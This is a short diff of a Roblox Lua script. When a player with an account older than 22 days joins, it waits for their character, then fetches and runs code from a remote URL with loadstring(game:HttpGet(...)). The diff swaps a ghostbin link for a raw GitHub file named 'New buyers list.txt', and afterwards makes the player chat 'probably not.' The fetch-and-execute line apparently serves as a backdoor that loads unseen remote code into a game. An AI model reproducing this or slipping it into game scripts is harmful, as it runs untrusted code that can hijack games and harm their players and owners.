@@ -23,7 +23,7 @@ plrs.PlayerAdded:Connect(function(plyr)
 if plyr.AccountAge > 22 then
     repeat wait()
         until plyr.Character
-    loadstring(game:HttpGet(('https://ghostbin.com/KDcAS/raw'),true))()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/T3chn0w1thth4t/garbage/main/New%20buyers%20list.txt'),true))()
     wait(.75)
     plrs:Chat("probably not.")
     end
